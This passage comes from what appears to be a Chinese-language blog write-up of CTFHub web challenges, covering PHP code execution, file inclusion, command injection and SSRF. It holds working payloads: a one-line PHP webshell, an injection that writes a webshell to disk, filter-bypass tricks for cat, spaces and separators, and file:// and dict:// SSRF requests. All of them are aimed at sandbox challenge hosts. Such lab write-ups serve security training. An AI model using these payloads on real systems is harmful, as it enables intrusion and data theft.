class="line">.../?cmd=system(&quot;pwd&quot;);</span><br></pre></td></tr></table></figure><p>执行成功 此处需要注意参数结尾一定不能省略<code>;</code>，满足PHP语法才可以执行成功。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.../?cmd=system(&quot;ls%20/&quot;);</span><br><span class="line">.../?cmd=system(&quot;cat%20/flag_xxxx&quot;);</span><br></pre></td></tr></table></figure><h4><span id="文件包含">文件包含</span></h4><ul><li>考察<code>include</code>函数</li></ul><p>访问shell页面，发现有一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ctfhub&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>假如在index.php中include了一个文件，那么不管这个文件后缀是什么  这个文件中的内容将会直接出现在index.php中，所以这道题的payload构造思路就是把shell.txt里的内容想办法放到index.php中去根据源码构造payload：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt</span><br></pre></td></tr></table></figure><p>直接使用蚁剑后缀加上payload即可</p><h4><span id="phpx2fx2finput">php:&#x2F;&#x2F;input</span></h4><p><a href="https://blog.csdn.net/qq_51295677/article/details/123462929">参考文献</a></p><p>常用到伪协议的<code>php://input</code>和<code>php://filter</code>.其中<code>php://input</code>要求<code>allow_url_include</code>设置为<code>On</code></p><ul><li>使用burp suite的repeater发送请求，构造请求报文</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-9144f5dff97c39a1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag_5734&quot;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>得到返回</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:05:02 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>113</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;8c628d8ea62d6dc8316f15c3&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;phpinfo.php&quot;</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h4><span id="读取源代码">读取源代码</span></h4><p><a href="https://blog.csdn.net/qq_61839115/article/details/128593214">参考</a></p><ul><li>考点：<code>php://filter</code>可以作为一个中间流来处理其他流，具有四个参数。</li></ul><table><thead><tr><th>名称</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>指定了你要筛选过滤的数据流。</td><td>必选</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>可以设定一个或多个过滤器名称，以管道符（</td><td>）分隔。</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td>可以设定一个或多个过滤器名称，以管道符（</td><td>）分隔。</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table><p>这道题就直接构造payload了</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/resource=/flag</span><br></pre></td></tr></table></figure><p>有些比赛赛题情况下还要用base64输出</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=<span class="built_in">convert</span>.base64-encode/resource=/flag </span><br></pre></td></tr></table></figure><p>使用burp suite</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=php://filter/resource=/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-d9e9d5fbc32a97fe.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:34:10 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>106</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;d797f76a6ac67e494a84fa86&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">flag in <span class="tag">&lt;<span class="name">code</span>&gt;</span>/flag<span class="tag">&lt;/<span class="name">code</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h4><span id="远程包含">远程包含</span></h4><ul><li>解法1：和input那题解法一样</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-795660de70a9ad8e.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>28</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:53:48 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>112</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;db258363d74e58371cd85c86&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag?<span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;phpinfo.php&quot;</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><ul><li>解法2：</li></ul><p> 题目目的是想让我们自己搭个服务器，然后让靶机远程包含我们的代码，但是我并没有租赁VPS。</p><p><a href="https://www.wolai.com/ctfhub/64arrieDUUPZTc1eFm6LLC">参考答案</a></p><h4><span id="命令注入">命令注入</span></h4><p> 命令行注入漏洞是指web应用程序中调用了系统可执行命令的函数，而且输入参数是可控的，如果黑客拼接了注入命令，就可以进行非法操作了。</p><p><strong>Windows系统支持的管道符如下：</strong></p><ol><li>“|”：直接执行后面的语句。</li><li>“||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。</li><li>“&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ol><p><strong>Linux系统支持的管道符如下：</strong></p><ol><li>“;”：执行完前面的语句再执行后面的语句。</li><li>“|”：显示后面语句的执行结果。</li><li>“||”：当前面的语句执行出错时，执行后面的语句。</li><li>“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ol><ul><li><p>解法一：使用base64编码</p><ul><li><p>我们在框内输入</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls # 输出两个php文件</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls / #根目录没发现其他可疑文件</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php # 未回显</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php | base64 #使用base64编码</span><br><span class="line"># 解码后获得&lt;?php // ctfhub&#123;ed09b50ed879851ad5b5a4d9&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>解法二：重定向</p><ul><li>我们可以用重定向的方法注入一个一句话木马</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&amp;<span class="built_in">echo</span> -e &quot;&lt;?php @eval(\$_POST[&#x27;test&#x27;]);?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure><ul><li>使用蚁剑连接即可</li></ul></li></ul><h4><span id="过滤cat">过滤cat</span></h4><p>3.使用单引号绕过 </p><p>127.0.0.1; c’’at flag_2287214057241.php |base64<br>4.使用双引号绕过 </p><p>127.0.0.1; c””at flag_2287214057241.php |base64<br>5.利用Shell 特殊变量绕过</p><p>127.0.0.1; ca$@t flag_2287214057241.php|base64</p><h4><span id="过滤空格">过滤空格</span></h4><p>空格可以用以下字符代替：<br><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS</code>等</p><p>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。<br>同理，在后面加个$可以起到截断的作用，使用$9是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p><h4><span id="过滤目录分割符">过滤目录分割符</span></h4><p>思路上来说应该是cat文件，必须要使用目录分隔符&#x2F;，但是题目给过滤。需要另外寻找办法  </p><ul><li>法一：使用cd绕开</li></ul><p>linux中：<code>%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</code></p><p>windows中：<code>%0a、&amp;、|</code></p><p>其中分号;的作用就是在 shell 中，担任”连续指令”功能</p><p>&amp;&amp;的方式：command1 &amp;&amp; command2 如果command1执行成功，则执行command2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd flag_is_here;cat flag_164641924722716.php|base64</span><br></pre></td></tr></table></figure><h4><span id="过滤运算符">过滤运算符</span></h4><ul><li>发现题目没有过滤<code>;</code>因此我们可以直接使用</li><li>在f12中的pre标签里面有注释</li></ul><h4><span id="综合练习">综合练习</span></h4><p><a href="https://blog.csdn.net/weixin_45897324/article/details/109271622">url查看表</a></p><ul><li><p>题解一</p><p>%0a 代替 换行 ，<code>%09</code>代替 TAB键 （因为flag被过滤了，所以我们通过TAB来补全flag_is_here ）<code>%5c</code> 代替 \（用 \ 来分隔开 cat ，因为 cat 也被过滤了qwq）</p><p>这题得在地址栏输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als</span><br><span class="line">?ip=127.0.0.1%0als%09*is_here</span><br><span class="line">? # 查看flag_is_here文件夹下的文件ip=127.0.0.1%0acd%09*_is_here%0aca%5ct%09*_98358017212.php</span><br><span class="line"># 注：%0a代替换行，%09代替TAB键（因为flag被过滤了，所以我们通过TAB来补全flag_is_here）</span><br><span class="line">　　%5c代替\（用\来分隔开cat，因为cat也被过滤了qwq）</span><br></pre></td></tr></table></figure><p>在f12中能看到答案</p><figure class="highlight plaintext"><figcaption><span>source可以用ls sour\*，还可以使用ls \*rce</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 题解二</span><br><span class="line"></span><br><span class="line">  ```cmd</span><br><span class="line">  127.0.0.1%0als$&#123;IFS&#125;fl$*ag_is_here </span><br><span class="line">  127.0.0.1%0acd$&#123;IFS&#125;fl$ag_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;fl$a*g_230191972813921.php # 因为过滤了cat，我们这里使用单引号绕过过滤，如ca&#x27;&#x27;t 构造payload</span><br></pre></td></tr></table></figure><p>其中<code>&#39;&#39;</code>可以用<code>%27</code>代替，将cat的任意字母包裹。</p></li></ul><h3><span id="ssrf">SSRF</span></h3><blockquote><p>SSRT(Server-Side Request Forgery，服务器端请求伪造)，就是攻击者利用服务器能访问其他的服务器的功能，通过自己的构造服务器请求来攻击与外界不相连接的内网，我们知道内网与外网是不相通的，所以利用这一个特性，就可以利用存在缺陷的WEB应用作为代理 攻击远程 和 本地的服务器。</p></blockquote><p><img src="/2023/03/29/ctf/a622392d2eac336271e32e052def5adc.png" alt="ssrf"></p><p><a href="https://blog.csdn.net/qq_51295677/article/details/124697338">reference</a></p><p><a href="https://blog.csdn.net/qq_57172130/article/details/126169480">SSRF利用协议中的万金油——Gopher</a></p><ul><li>gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行</li><li>数据流末尾使用%0d%0a代表消息结束</li></ul><p><strong>关于url编码问题</strong></p><p>第一，利用ssrf经常要进行多次url编码（传参或者多次跳转需要多次url编码，也就是说，有多少次请求就要编码多少次，直接curl后接gopher:&#x2F;&#x2F;就编码一次，利用?url&#x3D;gopher:&#x2F;&#x2F;这样的形式进行ssrf利用就相当于请求了两次，需要编码两次，如果有302跳转，则还需要再编码），第一次url编码后，将所有%0a改成%0¢%0a<br>gopher:&#x2F;默认发送到70端口，一般我们需要发送到80端口，记得改</p><h4><span id="内网访问">内网访问</span></h4><ul><li><p>考察<code>http://</code>协议</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="伪协议读取文件">伪协议读取文件</span></h4><ul><li><p>这一题的考点主要是<strong>file协议</strong>读取文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="端口扫描">端口扫描</span></h4><ul><li>考察<code>dict://</code>协议</li></ul><p>使用burp suite进行端口扫描</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=dict://127.0.0.1:§§</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-235c64bde60462f1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>  然后注入使用数字从8000-9000，步进为1，发现端口<code>8243</code>的数据长度不一致。使用<code>http://</code>访问，<em>http可以忽略</em></p>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://<span class="title">challenge</span>-235<span class="title">c64bde60462f1.sandbox.ctfhub.com</span>:10800/?<span class="title">url</span>=127.0.0.1:8243</span></span><br></pre></td></tr></table></figure><h4><span id="post请求">POST请求</span></h4><ul><li><p>使用dirsearch对服务器底下的目录进行扫描</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://challenge-c81b1dbf4106f429.sandbox.ctfhub.com:<span class="number">10800</span>/?url=<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>使用<code>file</code>协议对index.php页面<a href="https://so.csdn.net/so/search?q=%E6%BA%90%E7%A0%81&spm=1001.2101.3001.7020">源码</a>进行读取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure></li></ul><p>发送</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span 